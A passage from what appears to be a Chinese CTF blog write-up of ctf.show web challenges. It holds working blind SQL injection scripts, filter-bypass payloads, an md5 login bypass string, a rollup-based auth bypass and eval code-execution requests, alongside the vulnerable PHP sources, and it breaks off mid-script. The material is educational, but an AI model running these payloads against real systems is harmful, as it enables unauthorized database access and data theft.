class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://7d7d60c5-b0fa-498e-842e-c12ef1378f0b.chall.ctf.show/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>数字型布尔注入，过滤空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;e3a532c0-bca9-4abc-a724-1adb2b991432.chall.ctf.show&#x2F;index.php?id&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    f1&#x3D;flag</span><br><span class="line">    top&#x3D;127</span><br><span class="line">    low&#x3D;33</span><br><span class="line">    while low&lt;&#x3D;top:</span><br><span class="line">        mid&#x3D;(top+low)&#x2F;&#x2F;2</span><br><span class="line">        p1&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid))</span><br><span class="line">        p2&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid))</span><br><span class="line">        try:</span><br><span class="line">            r1&#x3D;requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            if &#39;pitch-and-toss,&#39; in r1.text:</span><br><span class="line">                flag+&#x3D;chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">            r&#x3D;requests.get(url+p1)</span><br><span class="line">            if &#39;pitch-and-toss,&#39; in r.text:</span><br><span class="line">                low&#x3D;mid+1</span><br><span class="line">            else:</span><br><span class="line">                top&#x3D;mid-1</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">    if flag&#x3D;&#x3D;f1:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>过滤空格可以用<code>/**/</code>，过滤<code>if</code>用<code>case when 1=1 then 1 else 0 end</code>，过滤逗号用<code>from 1 for 1</code>截取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://9f999441-8cb2-4663-9f55-195bbfafe615.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>访问<code>/robots.txt</code>看到<code>index.phps</code>，源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($password)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>javisoj上的一道题，详细参考：<a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login</a></p><p>直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:ffifdyop</span><br></pre></td></tr></table></figure><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>同样访问<code>index.phps</code>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span>&#123;</span><br><span class="line">     $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">     <span class="keyword">return</span> preg_replace($regex,<span class="string">&quot;&quot;</span>,$strParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">if</span>($password==$row[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比较了替换后的长度和原来的长度，不相等就退出程序，这里有个小trick</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906010914.png"></p><p>group by很好理解，根据某个字段分组嘛，加上<code>WITH ROLLUP</code>的意思就是在group分组字段的基础上再进行统计数据，这时就会多出一个<code>NULL</code>值</p><p>对于这道题，我们只需用上这个点并且设置password为空就可以登陆，由于过滤了空格需要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup#</span><br></pre></td></tr></table></figure><p><code>NULL</code>弱等于空字符串，登陆成功</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span>&#123;</span><br><span class="line">     $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">     <span class="keyword">return</span> preg_replace($regex,<span class="string">&quot;&quot;</span>,$strParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($password==$_SESSION[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>password存在于session中，只需指定一个不存在的session id，password设置成空就行，同样是<code>NULL</code>弱等于空字符</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906115810.png"></p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>查看源码，提示<code>?cmd=</code>，第一次以为是命令执行，查看phpinfo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?cmd=show_source(&#x27;/var/www/html/index.php&#x27;);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br></pre></td></tr></table></figure><p>查找目录,读取文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;var_dump(scandir(&#39;.&#x2F;&#39;));</span><br><span class="line">?cmd&#x3D;show_source(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</span><br></pre></td></tr></table></figure><p>不知道为啥不过滤<code>scandir</code>，过滤了可以用glob协议绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p><code>.user.ini</code>绕过，详细参考：<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn</a></p><p>贴一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $size = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    $error = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    $arr = pathinfo($filename);</span><br><span class="line">    $ext_suffix = $arr[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($size &gt; <span class="number">24</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen($filename)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strlen($ext_suffix)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,$ext_suffix))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_name, <span class="string">&#x27;./&#x27;</span>.$filename))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = intval($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    <span class="keyword">switch</span> ($c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>由于switch没有碰到break时会一直往下执行，直接让<code>c</code>等于3就能输出<code>$url</code>，访问，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, $_GET[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和web7差不多，跑了下版本发现是：<code>10.2.26-MariaDB-log</code>，所有数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,web</span><br></pre></td></tr></table></figure><p>可以通过<code>information_schema</code>中的其他表来bypass，详细参考：<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb">https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//爆表</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(TABLE_NAME)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.KEY_COLUMN_USAGE<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="keyword">DATABASE</span>()</span><br><span class="line"></span><br><span class="line">//爆第一列</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(COLUMN_NAME)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.KEY_COLUMN_USAGE<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="keyword">DATABASE</span>()<span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name=<span class="string">&#x27;content&#x27;</span></span><br></pre></td></tr></table></figure><p>剩下的就要无列名注入了，需要先猜列数，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fbae9ee1-b59d-4b25-a39d-0e4af175f5da.chall.ctf.show/here_1s_your_f1ag.php?query=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> 